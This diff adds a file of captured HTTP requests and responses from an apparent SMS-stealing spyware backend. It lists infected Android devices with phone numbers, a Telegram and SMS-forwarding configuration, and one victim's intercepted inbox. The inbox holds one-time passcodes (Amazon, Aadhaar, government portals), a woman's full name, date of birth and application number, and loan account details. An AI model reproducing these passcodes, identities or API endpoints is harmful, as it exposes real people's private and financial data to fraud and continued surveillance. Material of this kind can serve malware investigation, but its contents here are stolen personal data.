@@ -1,0 +1,2616 @@
+GET /api/devices HTTP/1.1
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; POCO F1 MIUI/V12.0.3.0.QEJMIXM)
+Host: v0-remotemanagementsystem-six.vercel.app
+Connection: Keep-Alive
+Accept-Encoding: gzip
+
+
+
+
+
+[
+  {
+    "device_id": "b2c76650be02c3cd",
+    "device_name": "realme RMX3945",
+    "os_version": "Android 15",
+    "phone_number": "+917296931039",
+    "battery_level": 46,
+    "is_online": false,
+    "created_at": "2026-01-14T05:54:08.804Z"
+  },
+  {
+    "device_id": "10b115749e8be23f",
+    "device_name": "OPPO CPH2337",
+    "os_version": "Android 14",
+    "phone_number": "917615844863, 919549483601",
+    "battery_level": 53,
+    "is_online": false,
+    "created_at": "2026-01-14T05:56:04.141Z"
+  },
+  {
+    "device_id": "93a17a5f559308c6",
+    "device_name": "Xiaomi 22101316UP",
+    "os_version": "Android 14",
+    "phone_number": "+917870609582",
+    "battery_level": 58,
+    "is_online": false,
+    "created_at": "2026-02-06T04:18:14.831Z"
+  },
+  {
+    "device_id": "a515fe5c230a618e",
+    "device_name": "OnePlus HD1901",
+    "os_version": "Android 16",
+    "phone_number": "Not Found",
+    "battery_level": 10,
+    "is_online": false,
+    "created_at": "2026-02-13T06:09:08.606Z"
+  },
+  {
+    "device_id": "eb693b6b7699c9fc",
+    "device_name": "samsung SM-E156B",
+    "os_version": "Android 16",
+    "phone_number": "918006149185",
+    "battery_level": 41,
+    "is_online": false,
+    "created_at": "2026-02-14T06:27:48.146Z"
+  },
+  {
+    "device_id": "142c24bacb117393",
+    "device_name": "Xiaomi M2101K7BI",
+    "os_version": "Android 13",
+    "phone_number": "+918274898351",
+    "battery_level": 81,
+    "is_online": false,
+    "created_at": "2026-02-24T19:09:28.465Z"
+  },
+  {
+    "device_id": "395b9ced363bf515",
+    "device_name": "OPPO CPH2599",
+    "os_version": "Android 15",
+    "phone_number": "918210471885",
+    "battery_level": 55,
+    "is_online": false,
+    "created_at": "2026-03-09T15:20:38.136Z"
+  }
+]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+2nd api
+
+
+GET /api/config/telegram HTTP/1.1
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; POCO F1 MIUI/V12.0.3.0.QEJMIXM)
+Host: v0-remotemanagementsystem-six.vercel.app
+Connection: Keep-Alive
+Accept-Encoding: gzip
+
+
+
+{
+  "telegram_bot_token": "gg",
+  "telegram_chat_id": "cg"
+}
+
+
+
+
+
+
+
+3rd api 
+
+GET /api/config/sms_forward HTTP/1.1
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; POCO F1 MIUI/V12.0.3.0.QEJMIXM)
+Host: v0-remotemanagementsystem-six.vercel.app
+Connection: Keep-Alive
+Accept-Encoding: gzip
+
+
+
+{
+  "forward_number": "9456888851888"
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+4th api 
+
+
+GET /api/device/b2c76650be02c3cd/sms HTTP/1.1
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; POCO F1 MIUI/V12.0.3.0.QEJMIXM)
+Host: v0-remotemanagementsystem-six.vercel.app
+Connection: Keep-Alive
+Accept-Encoding: gzip
+
+
+
+[
+  {
+    "id": 914,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "Dear customer,With your existing HERO UL PACK RC349,you can now use unlimited high-speed data, from 12-6 a.m, at no additional cost.",
+    "received_at": "2026-03-12T08:27:23.083Z"
+  },
+  {
+    "id": 913,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "Best recharge to watch CRICKET on TV & Mobile! JioHotstar, SonyLIV, ZEE5 + 15 OTTs + 5GB Data. Recharge with Rs202 https://viapp.onelink.me/bSC3/202CVPRM",
+    "received_at": "2026-03-12T06:34:26.019Z"
+  },
+  {
+    "id": 912,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VM-VIFIN-P",
+    "message_body": "Need funds urgently?\nGet an Instant Loan from trusted lenders through Vi Finance.\nNo paperwork, minimal KYC!\nCheck your offer today: viapp.onelink.me/bSC3/pl1",
+    "received_at": "2026-03-12T06:30:01.695Z"
+  },
+  {
+    "id": 911,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-612345-P",
+    "message_body": "Enjoy Extra data with Vi!\n\nRs.26: Get 1.5GB Data for 1 Day\nRs.48: Get 3GB + 3GB (Free) Data for 3 Days\n\nRecharge now - https://viapp.onelink.me/bSC3/PrRch",
+    "received_at": "2026-03-12T05:27:52.153Z"
+  },
+  {
+    "id": 909,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Last-Call:00:01:36, Charge:Rs0.00, Main-Bal:Rs 0.00, ULPack-Exp:01-Apr-26",
+    "received_at": "2026-03-12T02:31:40.277Z"
+  },
+  {
+    "id": 899,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "You are missing out on your Data+UL Calls. Recharge Now! viapp.onelink.me/bSC3/121",
+    "received_at": "2026-03-09T18:02:42.785Z"
+  },
+  {
+    "id": 898,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VM-VIFIN-P",
+    "message_body": "Don't wait! Upgrade your life with a Rs 5,00,000 instant loan through Vi Finance.\nSeamless digital process & instant approval: viapp.onelink.me/bSC3/pl1",
+    "received_at": "2026-03-09T17:35:12.568Z"
+  },
+  {
+    "id": 897,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "Non Stop Hero! Rs 979 = Unlimited Data, full day for 84 Days\n1)179:UL+1GB+300SMS,28D\n2)299:1.5GB/D+UL,28D\nviapp.onelink.me/bSC3/121",
+    "received_at": "2026-03-09T16:35:25.733Z"
+  },
+  {
+    "id": 896,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "AX-CMPTPD-S",
+    "message_body": "Important Security Alert! Do not make your ULC-PP loan payment to any individual's savings/wallet account. Paytm officials will never ask you to do so. To report any fraud/suspicious activity contact, visit or write at m.paytm.me/CustomerSupport",
+    "received_at": "2026-03-09T15:54:07.039Z"
+  },
+  {
+    "id": 895,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Last-Call:00:00:30, Charge:Rs0.00, Main-Bal:Rs 0.00, ULPack-Exp:01-Apr-26",
+    "received_at": "2026-03-09T15:29:25.505Z"
+  },
+  {
+    "id": 889,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VM-VIFIN-P",
+    "message_body": "Unlock Rs 5,00,000 today!\nNo collateral, zero paperwork, minimal KYC. Fast-track your dreams through Vi Finance.\nClaim offer: viapp.onelink.me/bSC3/pl1",
+    "received_at": "2026-03-08T07:49:35.445Z"
+  },
+  {
+    "id": 888,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "Dear customer,With your existing HERO UL PACK RC349,you can now use unlimited high-speed data, from 12-6 a.m, at no additional cost.",
+    "received_at": "2026-03-08T07:07:12.661Z"
+  },
+  {
+    "id": 887,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-612345-P",
+    "message_body": "Enjoy Extra data with Vi!\n\nRs.26: Get 1.5GB Data for 1 Day\nRs.48: Get 3GB + 3GB (Free) Data for 3 Days\n\nRecharge now - https://viapp.onelink.me/bSC3/PrRch",
+    "received_at": "2026-03-08T06:56:38.863Z"
+  },
+  {
+    "id": 883,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Last-Call:00:00:35, Charge:Rs0.00, Main-Bal:Rs 0.00, ULPack-Exp:01-Apr-26",
+    "received_at": "2026-03-08T03:44:03.428Z"
+  },
+  {
+    "id": 882,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JK-ISFCHL-S",
+    "message_body": "Dear Customer, We have received your application form. By confirming this OTP 65636 you declare that you have read the application form and agree to the TnC mentioned in the application form https://itrust.indiashelter.in:6443/api/application-form/?SndueG42TnpqeDlt Thanks, India Shelter Finance Corporation Limited",
+    "received_at": "2026-03-08T00:43:01.449Z"
+  },
+  {
+    "id": 881,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JK-ISFCHL-S",
+    "message_body": "Congratulations! Your Aadhaar eKYC verification was successful for your Loan Application Process. Thank you for your cooperation. In case you have not initiated the Loan Application please call at 1800-572-8888\nThank you\nIndia Shelter Finance Corporation",
+    "received_at": "2026-03-08T00:22:56.705Z"
+  },
+  {
+    "id": 880,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "BZ-ADHAAR-G",
+    "message_body": "428982 is OTP for Aadhaar (XX4549) (valid for 10 mins) at ISFCL. Enroll your child/infant for Aadhaar. Call1947/uidai.gov.in -UIDAI",
+    "received_at": "2026-03-08T00:22:53.429Z"
+  },
+  {
+    "id": 879,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JM-ISFCHL-S",
+    "message_body": "Dear Customer, We have received your loan application at India Shelter. OTP to proceed with loan application is 96265. By sharing the OTP the applicant, authorize India shelter finance corporation to obtain their eKYC authentication, credit history, download CKYC report and do KYC checks. Reach out to us on toll free number 18005728888 and WhatsApp number 917065324444. Click here to read the TnCs https://agile.indiashelter.in/?tc=true Thanks, India Shelter Finance Corporation Limited",
+    "received_at": "2026-03-08T00:22:40.249Z"
+  },
+  {
+    "id": 872,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Last-Call:00:01:31, Charge:Rs0.00, Main-Bal:Rs 0.00, ULPack-Exp:01-Apr-26",
+    "received_at": "2026-03-07T05:36:04.729Z"
+  },
+  {
+    "id": 869,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Binge at night without limits! Surf,Stream,Share nonstop from 12-6am within same pack at NO extra cost, bit.ly/GetViApp .To stop alerts,dial *199*2*2*4#",
+    "received_at": "2026-03-06T18:43:21.474Z"
+  },
+  {
+    "id": 850,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "CP-FINABC-S",
+    "message_body": "Dear Customer, your ABCL Loan A/C no. PYTMPPABFL106693112289053 has Days Past Due (DPD) of 1090 days as on 28-02-2026. This will be reported to Credit Bureau this month. Regards, Aditya Birla Capital Limited",
+    "received_at": "2026-03-05T13:57:28.190Z"
+  },
+  {
+    "id": 849,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-612345-P",
+    "message_body": "🚀 Upgrade your data game with Vi! 📶\nNeed a quick boost? Pick the pack that fits your vibe and keep scrolling:\n\n🔥 *The Quick Fix:*\n₹26 ➔ Get 1.5GB of high-speed data! ⚡\n(Valid for 1 Day)\n\n✨ *The Extra Value Deal:*\n₹48 ➔ Get 3GB + 3GB FREE (Total 6GB)! 🎁\n(Valid for 3 Days)\n\nDon’t let the loading circle ruin your mood. Tap below to recharge instantly:\n*Recharge now* - https://viapp.onelink.me/bSC3/PrRch",
+    "received_at": "2026-03-05T13:06:52.721Z"
+  },
+  {
+    "id": 848,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Last-Call:00:00:36, Charge:Rs0.00, Main-Bal:Rs 0.00, ULPack-Exp:01-Apr-26",
+    "received_at": "2026-03-05T12:35:52.741Z"
+  },
+  {
+    "id": 847,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-ViCARE",
+    "message_body": "Rs349 recharge done! We have credited Non-stop HERO benefits. Your pack now has Unlimited data+ calls +100SMS/Day. Validity:28Days",
+    "received_at": "2026-03-05T12:28:29.413Z"
+  },
+  {
+    "id": 846,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Data adding up! You have_Bal:0.00GB unused Data so far this week,for nonstop binge this weekend.Know more, bit.ly/GetViApp .To stop alerts,dial *199*2*2*4##XRJD",
+    "received_at": "2026-03-05T12:28:13.628Z"
+  },
+  {
+    "id": 845,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "WOW! Upto Rs50 CASHBK on AmazonPay with Vi NonStopHero rechg. TnC.\n  1)179:UL+1GB+300SMS,28D\n2)299:1.5GB/D+UL,28D\nwww.amazon.in/VI",
+    "received_at": "2026-03-05T09:20:10.376Z"
+  },
+  {
+    "id": 820,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "Attention! Your Vi Data+UL Calls Pack EXPIRES in 3 Days. viapp.onelink.me/bSC3/121",
+    "received_at": "2026-03-02T11:06:32.406Z"
+  },
+  {
+    "id": 814,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-ViCARE",
+    "message_body": "Rs.22 recharged! Enjoy 1 GB high-speed Data, valid for 1 day (till 11:59pm). No Service Validity. Click https://viapp.onelink.me/bSC3/ho",
+    "received_at": "2026-03-01T16:48:10.248Z"
+  },
+  {
+    "id": 809,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:05-Mar-26",
+    "received_at": "2026-03-01T01:44:32.499Z"
+  },
+  {
+    "id": 806,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "Alert! Your Unlimited Pack EXPIRED 2 Days ago! For Best Offers Click viapp.onelink.me/bSC3/121 \n1)365:UL data+calls+100SMS/D,28D",
+    "received_at": "2026-02-28T05:35:08.675Z"
+  },
+  {
+    "id": 804,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "Rs20 OFF! Enjoy Unlimited data & calls,28days at just Rs345, instead of Rs365, only on Vi app viapp.onelink.me/bSC3/rcoff4",
+    "received_at": "2026-02-27T05:54:13.260Z"
+  },
+  {
+    "id": 803,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VM-VISHP-P",
+    "message_body": "Need cash now?\nGet a personal loan upto Rs 5,00,000 instantly! No collateral needed. Apply Now : https://viapp.onelink.me/bSC3/pl1",
+    "received_at": "2026-02-27T05:53:37.134Z"
+  },
+  {
+    "id": 802,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "Alert! Your Unlimited Pack EXPIRED YESTERDAY! For Best Offers Click viapp.onelink.me/bSC3/121 \n1)365:UL data+calls+100SMS/D,28D",
+    "received_at": "2026-02-27T05:34:20.374Z"
+  },
+  {
+    "id": 800,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Last-Call:00:00:18, Charge:Rs0.00, Main-Bal:Rs 0.00, ULPack-Exp:26-Feb-26",
+    "received_at": "2026-02-25T18:31:26.071Z"
+  },
+  {
+    "id": 799,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-612345-P",
+    "message_body": "प्रिय Vi ग्राहक आपका Vi पैक समाप्त होने वाला है,आज ही रिचार्ज करेंl Rs-365 Unlimited Calls, Hero Non Stop Data, 28 Days Validity https://viapp.onelink.me/bSC3/PrRch ignore if already recharged.",
+    "received_at": "2026-02-25T13:33:46.944Z"
+  },
+  {
+    "id": 798,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "Alert!Your Unlimited Pack is EXPIRING TOMORROW! For Best offers.Click viapp.onelink.me/bSC3/121\n1)479:1GB/D+UL,54D,\n2)649:Unlimited Data,56D",
+    "received_at": "2026-02-25T13:26:40.093Z"
+  },
+  {
+    "id": 797,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "Rs20 OFF! Enjoy Unlimited data & calls,28days at just Rs345, instead of Rs365, only on Vi app viapp.onelink.me/bSC3/rcoff4",
+    "received_at": "2026-02-25T13:26:19.808Z"
+  },
+  {
+    "id": 796,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "AD-INDANE-S",
+    "message_body": "Dear PMUY Customer,you availed 8/9th LPG refill,your eKYC is pending,subsidy of Rs300/14.2 kg cyl on hold.Pl. do eKYC by March'26.Toll Free 18002333555 -IOCL",
+    "received_at": "2026-02-25T13:21:08.820Z"
+  },
+  {
+    "id": 795,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Last-Call:00:02:18, Charge:Rs0.00, Main-Bal:Rs 0.00, ULPack-Exp:26-Feb-26",
+    "received_at": "2026-02-25T13:02:48.847Z"
+  },
+  {
+    "id": 794,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Alert! Your Vi Unlimited calling pack EXPIRES on  26-Feb-26 . To continue enjoying pack benefits, recharge NOW https://bit.ly/Vi-WDR",
+    "received_at": "2026-02-25T13:02:17.858Z"
+  },
+  {
+    "id": 793,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-612345-P",
+    "message_body": "🚀 Upgrade your data game with Vi! 📶\nNeed a quick boost? Pick the pack that fits your vibe and keep scrolling:\n\n🔥 *The Quick Fix:*\n₹26 ➔ Get 1.5GB of high-speed data! ⚡\n(Valid for 1 Day)\n\n✨ *The Extra Value Deal:*\n₹48 ➔ Get 3GB + 3GB FREE (Total 6GB)! 🎁\n(Valid for 3 Days)\n\nDon’t let the loading circle ruin your mood. Tap below to recharge instantly:\n*Recharge now* - https://viapp.onelink.me/bSC3/PrRch",
+    "received_at": "2026-02-25T12:27:14.656Z"
+  },
+  {
+    "id": 792,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-612345-P",
+    "message_body": "प्रिय Vi ग्राहक आपका Vi पैक समाप्त होने वाला है,आज ही रिचार्ज करेंl Rs-365 Unlimited Calls, Hero Non Stop Data, 28 Days Validity https://viapp.onelink.me/bSC3/PrRch ignore if already recharged.",
+    "received_at": "2026-02-25T11:23:18.388Z"
+  },
+  {
+    "id": 791,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VM-VIFIN-P",
+    "message_body": "Need funds urgently?\nGet an Instant Loan from trusted lenders through Vi Finance.\nNo paperwork, minimal KYC!\nCheck your offer today: viapp.onelink.me/bSC3/pl1",
+    "received_at": "2026-02-25T11:22:08.373Z"
+  },
+  {
+    "id": 779,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Data adding up! You have_Bal:2.00GB unused Data so far this week,for nonstop binge this weekend.Know more, bit.ly/GetViApp .To stop alerts,dial *199*2*2*4##XRJD",
+    "received_at": "2026-02-24T00:48:19.363Z"
+  },
+  {
+    "id": 770,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "Get 1 year UL Pack+1.5GB/Day @ Rs3499\n1)179:UL+1GB+300SMS,28D\n2)299:1.5GB/D+UL,28D\nviapp.onelink.me/bSC3/121",
+    "received_at": "2026-02-21T14:13:28.132Z"
+  },
+  {
+    "id": 769,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VM-611121-P",
+    "message_body": "Hello! Now Recharge with Rs 47 and get Unlimited Callertunes for 28 Days! To avail this offer click https://viapp.onelink.me/bSC3/vict01",
+    "received_at": "2026-02-21T11:58:16.176Z"
+  },
+  {
+    "id": 768,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Last-Call:00:00:44, Charge:Rs0.00, Main-Bal:Rs 0.00, ULPack-Exp:26-Feb-26",
+    "received_at": "2026-02-21T11:35:43.681Z"
+  },
+  {
+    "id": 767,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Alert! Your Vi Unlimited calling pack EXPIRES on  26-Feb-26 . To continue enjoying pack benefits, recharge NOW https://bit.ly/Vi-WDR",
+    "received_at": "2026-02-21T11:35:38.241Z"
+  },
+  {
+    "id": 764,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "BH-YASGOV-G",
+    "message_body": "Final call! Take MY Bharat Budget Quest 2026 Quiz today and move to next stage.\r\nQuiz: https://mybharat.gov.in/quiz/quiz_dashboard/aDVZUXhJY2ZhL2wzaXNhOFZwQko2QT09",
+    "received_at": "2026-02-20T13:54:28.490Z"
+  },
+  {
+    "id": 763,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "57575022",
+    "message_body": "208714 is your Amazon OTP. Don't share it with anyone.",
+    "received_at": "2026-02-20T13:31:36.174Z"
+  },
+  {
+    "id": 762,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "Non Stop Hero 649 = Unlimited Data, full day for 56 Days\n1)349:2GB/D+UL,28D\n2)479:1GB/D+UL,54D\nviapp.onelink.me/bSC3/121",
+    "received_at": "2026-02-20T13:25:09.948Z"
+  },
+  {
+    "id": 756,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Binge at night without limits! Surf,Stream,Share nonstop from 12-6am within same pack at NO extra cost, bit.ly/GetViApp .To stop alerts,dial *199*2*2*4#",
+    "received_at": "2026-02-18T19:20:20.333Z"
+  },
+  {
+    "id": 752,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "+919509977063",
+    "message_body": "I'll call you right back.",
+    "received_at": "2026-02-18T06:48:59.340Z"
+  },
+  {
+    "id": 751,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Last-Call:00:00:10, Charge:Rs0.00, Main-Bal:Rs 0.00, ULPack-Exp:26-Feb-26",
+    "received_at": "2026-02-18T05:24:28.458Z"
+  },
+  {
+    "id": 742,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-612345-P",
+    "message_body": "Enjoy Extra data with Vi!\n\nRs.26: Get 1.5GB Data for 1 Day\nRs.48: Get 3GB + 3GB (Free) Data for 3 Days\n\nRecharge now - https://viapp.onelink.me/bSC3/PrRch",
+    "received_at": "2026-02-16T06:41:23.501Z"
+  },
+  {
+    "id": 738,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Last-Call:00:01:42, Charge:Rs0.00, Main-Bal:Rs 0.00, ULPack-Exp:26-Feb-26",
+    "received_at": "2026-02-14T22:46:33.904Z"
+  },
+  {
+    "id": 736,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-ViBS-P",
+    "message_body": "Get 1-month JioHotstar + 5GB extra = perfect binge! on JioHotstar with Vi pack @ ₹101. Click: https://viapp.onelink.me/bSC3/jh101cvm",
+    "received_at": "2026-02-14T09:24:55.771Z"
+  },
+  {
+    "id": 735,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-ViBS-P",
+    "message_body": "One recharge for top OTTs! JioHotstar, SonyLIV, ZEE5 & more. Subscribe to the Vi Movies & TV, get FREE DATA! Instal now viapp.onelink.me/bSC3/OB6",
+    "received_at": "2026-02-14T08:54:42.035Z"
+  },
+  {
+    "id": 732,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-612345-P",
+    "message_body": "Enjoy Extra data with Vi!\n\nRs.26: Get 1.5GB Data for 1 Day\nRs.48: Get 3GB + 3GB (Free) Data for 3 Days\n\nRecharge now - https://viapp.onelink.me/bSC3/PrRch",
+    "received_at": "2026-02-14T06:30:06.604Z"
+  },
+  {
+    "id": 729,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Last-Call:00:00:21, Charge:Rs0.00, Main-Bal:Rs 0.00, ULPack-Exp:26-Feb-26",
+    "received_at": "2026-02-14T05:00:38.832Z"
+  },
+  {
+    "id": 707,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Data adding up! You have_Bal:4.00GB unused Data so far this week,for nonstop binge this weekend.Know more, bit.ly/GetViApp .To stop alerts,dial *199*2*2*4##XRJD",
+    "received_at": "2026-02-11T01:10:42.929Z"
+  },
+  {
+    "id": 706,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "+918875718184",
+    "message_body": "OkCredit: आपको डिफाल्टर लिस्ट में जोड़ा गया.कृपया अपने  ₹1,120 चुकाएँ\n𝐏𝐀𝐏𝐏𝐀𝐍 𝐊𝐈𝐑𝐀𝐍𝐀 𝐒𝐓𝐎𝐑 𝐒𝐀𝐁𝐎𝐑𝐀 (8875718184)\nokcr.in/app पर  डिटेल्स  देखें",
+    "received_at": "2026-02-10T12:47:20.734Z"
+  },
+  {
+    "id": 705,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "BZ-YASGOV-G",
+    "message_body": "Do not miss the opportunity! MY Bharat Budget Quest 2026 Quiz ends soon. Quiz: https://mybharat.gov.in/quiz/quiz_dashboard/aDVZUXhJY2ZhL2wzaXNhOFZwQko2QT09",
+    "received_at": "2026-02-10T11:54:28.428Z"
+  },
+  {
+    "id": 704,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-612345-P",
+    "message_body": "Enjoy Extra data with Vi!\n\nRs.26: Get 1.5GB Data for 1 Day\nRs.48: Get 3GB + 3GB (Free) Data for 3 Days\n\nRecharge now - https://viapp.onelink.me/bSC3/PrRch",
+    "received_at": "2026-02-10T11:54:17.223Z"
+  },
+  {
+    "id": 703,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Last-Call:00:00:37, Charge:Rs0.00, Main-Bal:Rs 0.00, ULPack-Exp:26-Feb-26",
+    "received_at": "2026-02-10T11:47:59.978Z"
+  },
+  {
+    "id": 702,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JG-ISATHI-G",
+    "message_body": "Want to check if your mobile is genuine? Download Sanchar Saathi to check : Android : https://play.google.com/store/apps/details?id=com.dot.app.sancharsaathi iOS : https://apps.apple.com/in/app/sanchar-saathi/id6739700695 Dept of Telecom, Govt of India",
+    "received_at": "2026-02-10T11:37:22.739Z"
+  },
+  {
+    "id": 661,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Daily Free SMS Balance Left :99, Main-Bal:Rs0.00, ULPack-Exp:26-Feb-26",
+    "received_at": "2026-02-07T03:13:28.036Z"
+  },
+  {
+    "id": 660,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Last-Call:00:02:46, Charge:Rs0.00, Main-Bal:Rs 0.00, ULPack-Exp:26-Feb-26",
+    "received_at": "2026-02-07T02:52:25.179Z"
+  },
+  {
+    "id": 658,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "TM-RAJSMS-G",
+    "message_body": "Dear BHARTI KUMARI, Your  application for the post/subject of SUPERVISOR (WOMEN) for SUPERVISOR (WOMEN) DIRECT RECRUITMENT-2026 has been submitted successfully.\n Application No : 202651341351\nName: BHARTI KUMARI\nDOB : 10-Jul-2001\nCategory: BC,WE - Rajasthan Staff Selection Board,Jaipur, GoR",
+    "received_at": "2026-02-06T09:44:02.409Z"
+  },
+  {
+    "id": 656,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "BP-RAJSMS-G",
+    "message_body": "Dear  BHARTI KUMARI, Your OTP is 34064 for mobile number verification Do not share it with anyone - Rajasthan Staff Selection Board,Jaipur, GoR",
+    "received_at": "2026-02-06T09:43:17.240Z"
+  },
+  {
+    "id": 655,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "TM-RAJSMS-G",
+    "message_body": "Dear BHARTI KUMARI, Your OTP is 226693 for mobile number verification. Do not share it with anyone - DoITC, GoR",
+    "received_at": "2026-02-06T09:40:07.365Z"
+  },
+  {
+    "id": 654,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "919649210224",
+    "message_body": "Dear Customer, You have a missed call from +919649210224 The last missed call was at 12:51 PM on 06-Feb-2026 Thankyou, Team Jio.",
+    "received_at": "2026-02-06T09:10:29.248Z"
+  },
+  {
+    "id": 653,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "TM-RAJSMS-G",
+    "message_body": "Dear BHARTI KUMARI, Your OTP is 197149 for mobile number verification. Do not share it with anyone - DoITC, GoR",
+    "received_at": "2026-02-06T09:07:45.557Z"
+  },
+  {
+    "id": 652,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JX-JioSvc-S",
+    "message_body": "Your Jio number is ready for use. \nFor seamless data experience across the country, set the 'Data Roaming' as On/Always. \nTo know 'How to Set up Jio Network' on mobile, click http://tiny.jio.com/ysetjioneten",
+    "received_at": "2026-02-06T09:06:31.783Z"
+  },
+  {
+    "id": 651,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "919887593729",
+    "message_body": "Dear Customer, You have a missed call from +919887593729 The last missed call was at 12:11 PM on 06-Feb-2026 Thankyou, Team Jio.",
+    "received_at": "2026-02-06T09:06:31.573Z"
+  },
+  {
+    "id": 650,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JA-JioSvc-S",
+    "message_body": "For seamless data experience across the country, set the 'Data Roaming' as On/Always.\nTo know 'How to Set up Jio Network' on mobile, click http://tiny.jio.com/ysetjioneten\nTo know your number, track balance & usage, give a miss call to 1299.",
+    "received_at": "2026-02-06T09:06:23.172Z"
+  },
+  {
+    "id": 633,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Data adding up! You have_Bal:6.00GB unused Data so far this week,for nonstop binge this weekend.Know more, bit.ly/GetViApp .To stop alerts,dial *199*2*2*4##XRJD",
+    "received_at": "2026-02-05T01:00:02.943Z"
+  },
+  {
+    "id": 631,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
